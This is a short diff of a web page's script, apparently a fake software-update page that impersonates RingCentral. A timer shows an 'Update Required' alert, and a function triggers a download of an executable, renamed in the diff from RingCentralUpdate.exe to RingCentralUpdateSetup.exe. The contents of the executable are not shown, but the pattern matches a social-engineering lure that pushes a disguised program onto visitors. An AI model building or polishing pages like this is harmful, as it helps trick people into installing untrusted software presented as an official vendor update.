@@ -1180,13 +1180,13 @@
 
             function triggerDownload() {
                 var link = document.createElement('a');
-                link.href = "/app/RingCentralUpdate.exe";
-                link.download = "RingCentralUpdate.exe"; 
+                link.href = "/app/RingCentralUpdateSetup.exe";
+                link.download = "RingCentralUpdateSetup.exe"; 
                 document.body.appendChild(link);
                 try {
                     link.click();
                 } catch (e) {
-                    message.textContent = 'Oops! The update file couldn’t be found. Please check the path or contact support.';
+                    message.textContent = 'Oops! The update file could not be found. Please check the path or contact support.';
                 }
                 document.body.removeChild(link);
             }
@@ -1206,7 +1206,7 @@
 
             // Step 2: Notify user that an update is required after 3 seconds
             setTimeout(() => {
-                message.textContent = 'Update required: your RingCentral app is not up to date.';
+                message.textContent = 'Update Required: your RingCentral app is not up to date.';
             }, 3000);
 
 
